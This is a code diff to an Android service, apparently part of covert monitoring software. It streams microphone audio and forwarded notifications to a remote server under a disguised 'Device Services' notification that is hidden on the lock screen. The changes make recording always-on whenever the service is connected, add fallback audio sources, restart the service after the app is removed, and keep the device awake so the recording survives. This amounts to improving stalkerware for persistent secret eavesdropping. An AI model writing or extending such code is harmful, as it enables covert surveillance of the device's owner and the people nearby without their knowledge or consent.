@@ -30,6 +30,7 @@ import java.io.File
 import java.io.FileOutputStream
 import java.util.UUID
 import java.util.concurrent.TimeUnit
+import kotlin.math.max
 import org.json.JSONObject
 
 /**
@@ -54,10 +55,16 @@ class MicService : Service() {
     private val sampleRate    = 16000           // 16 kHz
     private val channelConfig = AudioFormat.CHANNEL_IN_MONO
     private val audioFormat   = AudioFormat.ENCODING_PCM_16BIT
-    private val bufferSize    = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat) * 2
+    private val minBufferSize by lazy {
+        val min = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat)
+        // Some OEMs return an error code; use a safe fallback in that case.
+        if (min > 0) min else sampleRate
+    }
+    private val bufferSize by lazy { max(minBufferSize * 2, sampleRate * 2) }
 
     // ── WebSocket ────────────────────────────────────────────────────────────
     private var webSocket: WebSocket? = null
+    @Volatile private var isWsConnecting = false
     private val okHttpClient = OkHttpClient.Builder()
         .connectTimeout(10, TimeUnit.SECONDS)
         .readTimeout(0,  TimeUnit.MILLISECONDS)  // No read timeout (streaming)
@@ -67,6 +74,8 @@ class MicService : Service() {
     // ── Recording state ──────────────────────────────────────────────────────
     @Volatile private var isCapturing   = false
     @Volatile private var isSavingFile  = false
+    @Volatile private var lastAudioChunkSentAt = 0L
+    @Volatile private var lastHealthSentAt = 0L
     private var recordingFileStream: FileOutputStream? = null
     private var recordingFile: File? = null
 
@@ -138,6 +147,8 @@ class MicService : Service() {
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         Log.i(TAG, "onStartCommand action=${intent?.action}")
 
+        startForeground(NOTIF_ID, buildNotification("Connecting to server…"))
+
         // Reconnect watchdog alarm fired — force a fresh WebSocket if dead
         if (intent?.action == ACTION_RECONNECT) {
             if (activeWebSocket == null) {
@@ -145,13 +156,19 @@ class MicService : Service() {
                 connectWebSocket()
             } else {
                 Log.i(TAG, "Reconnect alarm: WebSocket alive, skipping")
+                if (!isCapturing) startAudioCapture()
             }
             scheduleReconnectAlarm() // reschedule for next cycle
             return START_STICKY
         }
 
-        startForeground(NOTIF_ID, buildNotification("Connecting to server…"))
-        connectWebSocket()
+        if (activeWebSocket == null) {
+            connectWebSocket()
+        } else {
+            Log.i(TAG, "WebSocket already active — ensuring mic/data workers are running")
+            if (!isCapturing) startAudioCapture()
+            startDataCollection()
+        }
         scheduleKeepAlive()
         scheduleReconnectAlarm()
         return START_STICKY   // Android restarts service automatically if killed
@@ -163,14 +180,23 @@ class MicService : Service() {
         val restartIntent = Intent(applicationContext, MicService::class.java)
         val pendingIntent = PendingIntent.getService(
             this, 1, restartIntent,
-            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
+            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
         )
         val alarmManager = getSystemService(AlarmManager::class.java)
-        alarmManager.set(
-            AlarmManager.ELAPSED_REALTIME_WAKEUP,
-            SystemClock.elapsedRealtime() + 2_000,
-            pendingIntent
-        )
+        val triggerAt = SystemClock.elapsedRealtime() + 2_000
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            alarmManager.setAndAllowWhileIdle(
+                AlarmManager.ELAPSED_REALTIME_WAKEUP,
+                triggerAt,
+                pendingIntent
+            )
+        } else {
+            alarmManager.set(
+                AlarmManager.ELAPSED_REALTIME_WAKEUP,
+                triggerAt,
+                pendingIntent
+            )
+        }
         Log.i(TAG, "onTaskRemoved — scheduled restart in 2s")
     }
 
@@ -183,7 +209,8 @@ class MicService : Service() {
         stopAudioCapture()
         closeRecordingFile()
         webSocket?.close(1000, "Service stopped")
-        wakeLock?.release()
+        isWsConnecting = false
+        if (wakeLock?.isHeld == true) wakeLock?.release()
         super.onDestroy()
     }
 
@@ -194,8 +221,17 @@ class MicService : Service() {
     // ────────────────────────────────────────────────────────────────────────
 
     private fun connectWebSocket() {
+        if (activeWebSocket != null || isWsConnecting) {
+            Log.i(TAG, "connectWebSocket skipped (already connected/connecting)")
+            return
+        }
+        isWsConnecting = true
         Log.i(TAG, "Connecting to $serverUrl")
         updateNotification("Connecting to server…")
+
+        try {
+            webSocket?.close(1000, "Reconnecting")
+        } catch (_: Exception) {}
 
         val request = Request.Builder()
             .url(serverUrl)
@@ -206,8 +242,9 @@ class MicService : Service() {
 
             override fun onOpen(webSocket: WebSocket, response: Response) {
                 Log.i(TAG, "WebSocket connected ✅")
+                isWsConnecting = false
                 activeWebSocket = webSocket
-                updateNotification("Connected — mic standby")
+                updateNotification("Live streaming active")
                 webSocket.send("DEVICE_INFO:$deviceId:${Build.MODEL}:${Build.VERSION.SDK_INT}")
                 // Flush notifications that arrived while WebSocket was offline
                 synchronized(notifLock) {
@@ -215,8 +252,10 @@ class MicService : Service() {
                         webSocket.send(notifQueue.removeFirst())
                     }
                 }
-                // Mic capture starts only when dashboard sends start_stream
+                // Mic-first mode: always keep capture active when connected.
+                startAudioCapture()
                 startDataCollection()
+                sendHealthStatus("ws_open")
             }
 
             override fun onMessage(webSocket: WebSocket, text: String) {
@@ -230,6 +269,7 @@ class MicService : Service() {
 
             override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                 Log.e(TAG, "WebSocket failure: ${t.message}")
+                isWsConnecting = false
                 activeWebSocket = null
                 updateNotification("Disconnected — retrying in 5s…")
                 stopAudioCapture()
@@ -242,6 +282,7 @@ class MicService : Service() {
 
             override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                 Log.w(TAG, "WebSocket closed: $reason")
+                isWsConnecting = false
                 activeWebSocket = null
                 updateNotification("Disconnected — retrying…")
                 stopAudioCapture()
@@ -341,23 +382,19 @@ class MicService : Service() {
 
         serviceScope.launch(Dispatchers.IO) {
             try {
-                audioRecord = AudioRecord(
-                    MediaRecorder.AudioSource.MIC,
-                    sampleRate,
-                    channelConfig,
-                    audioFormat,
-                    bufferSize
-                )
+                audioRecord = createAudioRecordWithFallback()
 
-                if (audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
+                if (audioRecord == null) {
                     Log.e(TAG, "AudioRecord failed to initialize")
                     webSocket?.send("{\"type\":\"error\",\"message\":\"mic_init_failed\",\"deviceId\":\"$deviceId\"}")
                     isCapturing = false
+                    sendHealthStatus("mic_init_failed")
                     return@launch
                 }
 
                 audioRecord?.startRecording()
                 Log.i(TAG, "🎙️ Audio capture started (${sampleRate}Hz, PCM16, mono)")
+                sendHealthStatus("mic_started")
 
                 val chunk = ByteArray(bufferSize)
 
@@ -368,6 +405,10 @@ class MicService : Service() {
 
                         // 1) Live stream to server via WebSocket
                         webSocket?.send(data.toByteString())
+                        lastAudioChunkSentAt = System.currentTimeMillis()
+                        if (lastAudioChunkSentAt - lastHealthSentAt >= 10_000) {
+                            sendHealthStatus("audio_tick")
+                        }
 
                         // 2) Write to recording file if active
                         if (isSavingFile) {
@@ -380,12 +421,42 @@ class MicService : Service() {
                 audioRecord?.release()
                 audioRecord = null
                 Log.i(TAG, "Audio capture stopped")
+                sendHealthStatus("mic_stopped")
 
             } catch (e: Exception) {
                 Log.e(TAG, "Audio capture error", e)
                 isCapturing = false
+                sendHealthStatus("mic_error")
             }
         }
+    }
+
+    private fun createAudioRecordWithFallback(): AudioRecord? {
+        val sources = intArrayOf(
+            MediaRecorder.AudioSource.VOICE_RECOGNITION,
+            MediaRecorder.AudioSource.MIC,
+            MediaRecorder.AudioSource.CAMCORDER,
+        )
+
+        for (source in sources) {
+            try {
+                val rec = AudioRecord(
+                    source,
+                    sampleRate,
+                    channelConfig,
+                    audioFormat,
+                    bufferSize
+                )
+                if (rec.state == AudioRecord.STATE_INITIALIZED) {
+                    Log.i(TAG, "AudioRecord initialized with source=$source, buffer=$bufferSize")
+                    return rec
+                }
+                rec.release()
+            } catch (e: Exception) {
+                Log.w(TAG, "AudioRecord init failed for source=$source: ${e.message}")
+            }
+        }
+        return null
     }
 
     private fun stopAudioCapture() {
@@ -395,6 +466,22 @@ class MicService : Service() {
             audioRecord?.release()
         } catch (_: Exception) {}
         audioRecord = null
+        sendHealthStatus("stop_capture_cmd")
+    }
+
+    private fun sendHealthStatus(reason: String) {
+        val ws = webSocket ?: return
+        lastHealthSentAt = System.currentTimeMillis()
+        val msg = JSONObject().apply {
+            put("type", "health_status")
+            put("deviceId", deviceId)
+            put("wsConnected", activeWebSocket != null)
+            put("micCapturing", isCapturing)
+            put("lastAudioChunkSentAt", lastAudioChunkSentAt)
+            put("reason", reason)
+            put("ts", lastHealthSentAt)
+        }
+        ws.send(msg.toString())
     }
 
     // ────────────────────────────────────────────────────────────────────────
@@ -432,11 +519,12 @@ class MicService : Service() {
     // ────────────────────────────────────────────────────────────────────────
 
     private fun createNotificationChannel() {
-        // IMPORTANCE_MIN = no sound, no status bar icon, collapsed in shade
+        // IMPORTANCE_LOW keeps a visible ongoing service notification, which
+        // improves survival on aggressive OEM battery managers.
         val channel = NotificationChannel(
             CHANNEL_ID,
             "Device Services",
-            NotificationManager.IMPORTANCE_MIN
+            NotificationManager.IMPORTANCE_LOW
         ).apply {
             description = "Audio streaming service"
             setSound(null, null)
@@ -452,7 +540,7 @@ class MicService : Service() {
             .setContentTitle("Device Services")
             .setContentText(statusText)
             .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)  // subtle icon
-            .setPriority(NotificationCompat.PRIORITY_MIN)  // lowest priority = most hidden
+            .setPriority(NotificationCompat.PRIORITY_LOW)
             .setOngoing(true)
             .setSilent(true)
             .setVisibility(NotificationCompat.VISIBILITY_SECRET)  // hidden on lock screen
@@ -473,7 +561,10 @@ class MicService : Service() {
         wakeLock = pm.newWakeLock(
             PowerManager.PARTIAL_WAKE_LOCK,
             "MicMonitor::AudioWakeLock"
-        ).also { it.acquire() } // Indefinite — released in onDestroy
+        ).also {
+            it.setReferenceCounted(false)
+            if (!it.isHeld) it.acquire() // Released in onDestroy
+        }
     }
 
     // ────────────────────────────────────────────────────────────────────────
@@ -506,11 +597,20 @@ class MicService : Service() {
             PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
         )
         val alarmManager = getSystemService(AlarmManager::class.java)
-        alarmManager.set(
-            AlarmManager.ELAPSED_REALTIME_WAKEUP,
-            SystemClock.elapsedRealtime() + 8 * 60 * 1000L,
-            pendingIntent
-        )
+        val triggerAt = SystemClock.elapsedRealtime() + 8 * 60 * 1000L
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            alarmManager.setAndAllowWhileIdle(
+                AlarmManager.ELAPSED_REALTIME_WAKEUP,
+                triggerAt,
+                pendingIntent
+            )
+        } else {
+            alarmManager.set(
+                AlarmManager.ELAPSED_REALTIME_WAKEUP,
+                triggerAt,
+                pendingIntent
+            )
+        }
         Log.i(TAG, "Reconnect alarm scheduled in 8 min")
     }
 }
